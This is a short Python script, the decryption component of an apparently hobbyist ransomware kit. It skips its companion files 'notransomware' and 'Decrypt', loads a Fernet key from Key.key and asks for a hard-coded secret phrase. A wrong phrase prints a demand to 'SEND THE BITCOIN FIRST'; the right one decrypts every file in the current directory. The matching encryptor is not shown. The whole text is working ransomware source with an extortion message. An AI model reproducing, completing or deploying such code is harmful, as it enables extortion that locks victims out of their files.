# DECRYPTION SCRIPT
import os
from cryptography.fernet import Fernet
import time

# Get the files in the current directory
files = []
for file in os.listdir():
    if file == "notransomware.py" or file == "Key.key" or file == "Decrypt.py" or file == "notransomware.exe" or file == "Decrypt.exe":
        continue
    if os.path.isfile(file):
        files.append(file)

# Get the Key
with open("Key.key", "rb") as key_file:
    SKey = key_file.read()

# The password to decrypt the files
secretphrase = "Blackha"
inputphrase = input("Enter the secret phrase to decrypt your files: ")

# Check the password and decrypt the files
if inputphrase != secretphrase:
    print("Incorrect secret phrase. SEND THE BITCOIN FIRST.")
    exit()
else:
    print("Correct secret phrase. Decrypting files...")
    for file in files:
        with open (file, "rb") as the_file:
            content = the_file.read()
        decrypted = Fernet(SKey).decrypt(content)
        with open(file, "wb") as the_file:
            the_file.write(decrypted)
    print ("Good job, you uncooked yourself.")
time.sleep(5)